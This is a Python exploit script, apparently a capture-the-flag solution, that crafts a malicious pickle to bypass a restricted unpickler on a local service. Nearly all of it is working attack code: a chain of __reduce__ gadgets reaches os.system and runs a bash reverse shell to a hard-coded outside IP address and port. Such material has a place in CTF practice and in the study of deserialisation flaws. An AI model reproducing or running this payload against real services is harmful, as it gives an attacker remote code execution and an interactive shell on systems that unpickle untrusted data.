#!/usr/bin/env python3

import pickle, sys
from albireo import primer

### Unpickler bypass code referenced from https://ctftime.org/writeup/16723
class FakeMod(type(sys)):
    modules = {}

    def __init__(self, name):
        self.d = {}
        super().__init__(name)

    def __getattribute__(self, name):
        d = self()
        return d[name]

    def __call__(self):
        return object.__getattribute__(self, "d")

def attr(s):
    mod, name = s.split(".")
    if mod not in FakeMod.modules:
        FakeMod.modules[mod] = FakeMod(mod)
    d = FakeMod.modules[mod]()
    if name not in d:
        def f(): pass
        f.__module__ = mod
        f.__qualname__ = name
        f.__name__ = name
        d[name] = f
    return d[name]

def dumps(obj):
    # use python version of dumps
    # which is easier to hack
    pickle.dumps = pickle._dumps
    orig = sys.modules
    sys.modules = FakeMod.modules
    s = pickle.dumps(obj)
    sys.modules = orig
    return s

def craft(func, *args, dict=None, list=None, items=None):
    class X:
        def __reduce__(self):
            tup = func, tuple(args)
            if dict or list or items:
                tup += dict, list, items
            return tup
    return X()

def get_payload(LHOST, LPORT):
    c1 = craft(attr("picklable.__setattr__"), "picklable", attr("picklable.__dict__"))
    c2 = craft(
        attr("picklable.__getattribute__"),
        "__builtins__",
        items=[("__import__", attr("picklable.__getattribute__"))]
    )
    bs = craft(attr("picklable.get"), "__builtins__")
    c3 = craft(attr("picklable.update"), bs)
    ev = craft(attr("picklable.get"), "eval")
    c4 = craft(attr("picklable.__setitem__"), "picklable", ev)
    c5 = craft(attr("picklable.__call__"), f'__import__("requester").whatwg_url.six.sys.modules["os"].system("bash -c \'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\'")')

    obj = craft(attr("picklable.__setattr__"), "code", [c1, c2, c3, c4, c5])
    s = dumps(obj)

    return s
###

if __name__ == '__main__':
    HOST, PORT = 'localhost', 15961
    LHOST, LPORT = '143.248.235.34', 65432

    # We can speed this up by splitting the payload & sending them concurrently,
    #  then run the payload in our desired order
    s = primer(HOST, PORT, get_payload(LHOST, LPORT))

    # If we pop shell, this will block!
    fetch = s.get(f'http://{HOST}:{PORT}/')
